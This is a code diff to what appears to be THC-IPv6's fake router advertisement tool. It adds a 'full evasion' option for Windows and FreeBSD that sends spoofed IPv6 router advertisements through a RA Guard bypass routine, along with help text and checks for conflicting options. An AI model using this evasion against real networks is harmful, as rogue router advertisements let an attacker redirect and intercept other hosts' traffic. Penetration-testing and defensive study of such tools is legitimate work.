@@ -15,7 +15,7 @@
 
 int plife = 99999, rlife = 4096, llife = 2048, reach = 0, trans = 0, dlife = 4096, cnt, to_send = 256, flags = 0, myoff = 14;
 char *interface = NULL, *frbuf, *frbuf2, *frint, buf3[1232];
-int frbuflen, frbuf2len, do_overlap = 0, do_hop = 0, do_frag = 0, do_dst = 0, type = NXT_ICMP6, prio = 2, interval = 5, do_cleanup = 0;
+int frbuflen, frbuf2len, do_overlap = 0, do_hop = 0, do_full = 0, do_frag = 0, do_dst = 0, type = NXT_ICMP6, prio = 2, interval = 5, do_cleanup = 0;
 unsigned char *frip6, *frmac;
 thc_ipv6_hdr *frhdr = NULL;
 
@@ -41,6 +41,7 @@ void help(char *prg) {
   printf(" -F flags           Set one or more of the following flags: managed, other,\n");
   printf("                    homeagent, proxy, reserved; separate by comma\n");
   printf(" -E type            Router Advertisement Guard Evasion option. Types: \n");
+  printf("     F              full evasion (Windows and FreeBSD)\n");
   printf("     H              simple hop-by-hop header\n");
   printf("     1              simple one-shot fragmentation header (can add multiple)\n");
   printf("     D              insert a large destination header so that it fragments\n");
@@ -279,6 +280,9 @@ int main(int argc, char *argv[]) {
       }
       for (j = 0; j < strlen(optarg); j++) {
         switch (optarg[j]) {    // fall through to be fail safe on accidental misuse
+        case 'F':
+          do_full = 1;
+          break;
         case '0':              // fall through
         case 'O':
           do_overlap = 1;
@@ -305,6 +309,10 @@ int main(int argc, char *argv[]) {
         }
         if ((do_frag && (do_dst || do_overlap)) || (do_dst && do_overlap)) {
           fprintf(stderr, "Error: you can not use -E types 1, D, O and o together!\n");
+          exit(-1);
+        }
+        if (do_full && (do_dst || do_overlap || do_frag)) {
+          fprintf(stderr, "Error: you can not use -E type F together with any other evasion option\n");
           exit(-1);
         }
       }
@@ -557,7 +565,9 @@ int main(int argc, char *argv[]) {
   signal(SIGINT, exit_cleanup);
   printf("Starting to advertise router (Press Control-C to end) ...\n");
   while (sent < to_send || to_send > 255) {
-    if (do_dst) {
+    if (do_full) {
+      thc_send_raguard_bypass6(interface, ip6, dst, frmac, dstmac, NXT_ICMP6, frhdr->pkt + 40 + myoff, frhdr->pkt_len - 40 - myoff, 0);
+    } else if (do_dst) {
       thc_send_as_fragment6(interface, ip6, dst, type, frhdr->pkt + 40 + myoff, frhdr->pkt_len - 40 - myoff, 1232);
     } else if (do_overlap) {
       if (do_overlap == 1)
